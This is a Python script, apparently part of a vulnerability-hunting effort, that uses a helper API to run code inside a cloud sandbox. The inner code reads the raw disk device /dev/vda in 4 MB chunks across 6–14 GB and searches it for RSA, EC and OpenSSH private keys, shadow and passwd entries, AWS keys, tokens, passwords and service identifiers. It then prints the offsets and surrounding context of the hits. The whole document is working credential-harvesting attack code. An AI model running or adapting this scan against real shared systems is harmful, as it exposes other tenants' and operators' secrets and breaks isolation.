# -*- coding: utf-8 -*-
"""Phase35: vda 扫描段2 (6-14GB) + 段1 命中上下文提取"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_Cl9liLUyMxKTDz19T2QL6GseKvP3"  # fwtest14

GUEST = r'''
import os

fd = os.open('/dev/vda', os.O_RDONLY)

# 0) 提取段1命中上下文
for off in [0x841c5000, 0x107ffd3fc]:
    try:
        chunk = os.pread(fd, 4096, off - 1024)
        print('[ctx 0x%x] %r' % (off, chunk[:3000].replace(b'\x00', b' ')), flush=True)
    except Exception as e:
        print('[ctx 0x%x] EXC %s' % (off, e), flush=True)

# 1) 扫描段2: 6GB - 14GB
KEYS = [b'BEGIN RSA PRIVATE KEY', b'BEGIN EC PRIVATE KEY', b'BEGIN OPENSSH PRIVATE KEY',
        b'BEGIN PRIVATE KEY', b'authorized_keys', b'ssh_host_', b'shadow', b'passwd',
        b'/etc/', b'/root/', b'/home/', b'containerd', b'sbx_', b'team_', b'vcp_',
        b'AKIA', b'AWS_SECRET', b'secret', b'password', b'api.vercel.com', b'vercel',
        b'cell', b'proxy-ca', b'BEGIN CERTIFICATE', b'PRIVATE KEY', b'token']
start = 6 * 1024 * 1024 * 1024
end = 14 * 1024 * 1024 * 1024
hits = {}
total = 0
for off in range(start, end, 4 * 1024 * 1024):
    try:
        chunk = os.pread(fd, 4 * 1024 * 1024, off)
    except Exception:
        break
    total += len(chunk)
    for k in KEYS:
        idx = 0
        while True:
            idx = chunk.find(k, idx)
            if idx < 0:
                break
            hits.setdefault(k.decode('latin1'), []).append(off + idx)
            idx += len(k)
os.close(fd)
print('[scan2] total=%d MB' % (total // 1024 // 1024), flush=True)
for k, v in hits.items():
    print('== %s (%d) ==' % (k, len(v)), flush=True)
    for item in v[:12]:
        print('   off=0x%x' % item, flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg43.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg43.py"

if __name__ == "__main__":
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=180000)
    print('cmd:', c, flush=True)
    print(r[:10000], flush=True)
